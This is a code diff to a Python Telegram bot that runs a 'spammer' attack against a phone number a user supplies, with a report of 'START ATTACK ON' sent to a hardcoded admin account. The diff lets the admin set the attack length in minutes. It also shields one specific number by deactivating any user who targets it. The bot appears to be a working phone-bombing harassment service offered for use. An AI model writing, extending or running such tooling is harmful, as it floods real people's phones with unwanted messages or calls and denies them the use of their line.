@@ -100,8 +100,10 @@ def start_handler(message):
         if DataBaseManagerUser.check_login(user_id=user_id):
             if user_id == 1727224717:
                 phone_number = msg_content[0]
-                start_date = msg_content[1]
-                end_date = msg_content[2]
+                period = msg_content[1]
+                start_date = str(datetime.strftime((datetime.now()), "%Y-%m-%d %H:%M:%S"))
+                end_date = str(
+                    datetime.strftime((datetime.now() + timedelta(minutes=int(period))), "%Y-%m-%d %H:%M:%S"))
                 if target_phone_number_validation(phone_number):
                     bot.send_message(message.chat.id, "Started !")
                     bot.send_message(1727224717,
@@ -112,17 +114,21 @@ def start_handler(message):
                     bot.send_message(message.chat.id, "Phone Number Is Wrong !")
             else:
                 phone_number = msg_content[0]
-                start_date = str(datetime.strftime((datetime.now()), "%Y-%m-%d %H:%M:%S"))
-                end_date = str(
-                    datetime.strftime((datetime.now() + timedelta(minutes=1)), "%Y-%m-%d %H:%M:%S"))
-                if target_phone_number_validation(phone_number):
-                    bot.send_message(message.chat.id, "Started !")
-                    bot.send_message(1727224717,
-                                     f"USER_ID : {user_id} \nSTART ATTACK ON : {phone_number}")
-                    spammer(phone_number, start_date, end_date)
-                    bot.send_message(message.chat.id, "Done !")
+                if str(phone_number) != "9142520208":
+                    start_date = str(datetime.strftime((datetime.now()), "%Y-%m-%d %H:%M:%S"))
+                    end_date = str(
+                        datetime.strftime((datetime.now() + timedelta(minutes=1)), "%Y-%m-%d %H:%M:%S"))
+                    if target_phone_number_validation(phone_number):
+                        bot.send_message(message.chat.id, "Started !")
+                        bot.send_message(1727224717,
+                                         f"USER_ID : {user_id} \nSTART ATTACK ON : {phone_number}")
+                        spammer(phone_number, start_date, end_date)
+                        bot.send_message(message.chat.id, "Done !")
+                    else:
+                        bot.send_message(message.chat.id, "Phone Number Is Wrong !")
                 else:
-                    bot.send_message(message.chat.id, "Phone Number Is Wrong !")
+                    DataBaseManagerUser.deactivator(user_id=int(user_id))
+                    bot.send_message(message.chat.id, "No No Noooo :)")
         else:
             bot.send_message(message.chat.id, 'You Are Not Allowed !!')
 
